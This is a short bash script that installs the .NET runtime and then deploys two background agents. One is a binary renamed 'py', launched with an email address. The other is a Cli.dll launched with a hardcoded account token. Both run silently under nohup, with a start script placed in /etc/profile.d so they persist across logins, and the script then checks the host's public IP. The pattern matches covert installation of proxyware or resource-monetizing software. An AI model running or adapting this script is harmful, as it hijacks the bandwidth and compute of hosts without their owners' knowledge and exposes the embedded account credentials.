#!/bin/bash

apt-get update

wget https://packages.microsoft.com/config/ubuntu/18.04/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
sudo dpkg -i packages-microsoft-prod.deb
sudo apt-get install -y apt-transport-https
sudo apt-get update
sudo apt-get install -y aspnetcore-runtime-5.0

chmod +x ./py ./start.sh
mv ./py /usr/bin/
mv ./start.sh /etc/profile.d/
mv ./tm /run/

nohup py -l renqer@outlook.com > /dev/null 2>&1 &
nohup dotnet /run/tm/Cli.dll start accept --token XwsLWzzRaZ8WOyBwJUA5bILGeMWG5783cVXr49vLkaU= > /dev/null 2>&1 &

ps -ef
curl ifconfig.me
echo ''

rm packages-microsoft-prod.deb
